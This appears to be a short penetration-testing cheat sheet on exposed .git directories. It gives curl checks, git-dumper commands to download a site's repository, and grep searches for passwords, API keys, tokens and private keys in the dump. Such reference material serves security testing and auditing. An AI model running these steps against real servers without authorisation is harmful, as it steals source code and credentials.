# .git Directory Exposure

If `.git` is exposed on a web server, you can dump the entire source code including credentials, API keys, and configs.

## Detection
```bash
curl -s http://$TARGET_IP/.git/
curl -s http://$TARGET_IP/.git/config
curl -s http://$TARGET_IP/.git/HEAD
# If any returns content, .git is exposed
```

## Dump with git-dumper
```bash
# Install
pip install git-dumper

# Dump entire repository
git-dumper http://$TARGET_IP/.git/ ./dump-output/

# Now browse the dumped repo locally
cd dump-output
git log --oneline
git diff HEAD~1   # See recent changes/credentials
git show          # Show last commit details
```

## Manual extraction (if git-dumper fails)
```bash
# Sometimes .git/objects is blocked but other paths work
# Try: http://$TARGET_IP/.git/refs/heads/master
# Try: http://$TARGET_IP/.git/logs/HEAD
```

## What to look for in dumped repos
```bash
grep -r "password" ./dump-output/
grep -r "api_key" ./dump-output/
grep -r "secret" ./dump-output/
grep -r "token" ./dump-output/
grep -r "AWS" ./dump-output/
grep -r "-----BEGIN" ./dump-output/   # Private keys
```
